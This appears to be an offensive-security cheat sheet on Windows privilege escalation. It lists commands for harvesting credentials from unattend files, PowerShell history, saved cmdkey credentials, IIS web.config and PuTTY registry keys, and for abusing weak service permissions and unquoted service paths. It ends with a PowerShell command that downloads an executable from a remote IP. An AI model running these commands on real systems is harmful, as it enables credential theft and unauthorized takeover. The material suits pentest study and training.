## [Harvesting Passwords from Usual Spots]
- Unattended Windows Installations :
	-   C:\Unattend.xml
	-   C:\Windows\Panther\Unattend.xml
	-   C:\Windows\Panther\Unattend\Unattend.xml
	-   C:\Windows\system32\sysprep.inf
	-   C:\Windows\system32\sysprep\sysprep.xml

### Powershell history
```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
	
## Get the architecture
```cmd
wmic OS get OSArchitecture
```


### List saved Windows Credentials

```cmd
cmdkey /list
```

```cmd
runas /savecred /user:admin cmd.exe
``` 

### IIS Configuration

```cmd
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```
Check also conf files ::
```cmd
more "C:\inetpub\wwwroot\web.config"
more "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config"
```
	 
### Credential from software retrieving (Putty, MobaXterm,...)
```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

### [Exploitation of services]
- ### Insecure Permissions on Service Executable
If an attacker has rights on the binary of a service he migth change the binary by an evil payload.

```cmd
BINARY_PATH_NAME : C:\PROGRA~2\SYSTEM~1\WService.exe
```

Then 
```cmd 
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
```
If permissions allow the modification of the service.exe exploitation is possible !

- ### Unquoted Service Paths
If the path to the binary associated to an executable is not quoted we might use that by modifying the path. With quotes the *SCM* (ServiceControlManager) knows exactly where to look.
```
BINARY_PATH_NAME : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
```

```
BINARY_PATH_NAME : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
```


- ### Insecure Service Permissions

Check the Discretionary Access Control List with the Accesschk tool  from the Sysinternals suite :

```cmd
accesschk64.exe -qlc thmservice
```


powershell.exe -Command "Invoke-WebRequest -OutFile ./toto.exe http://10.8.12.51:8000/toto.exe"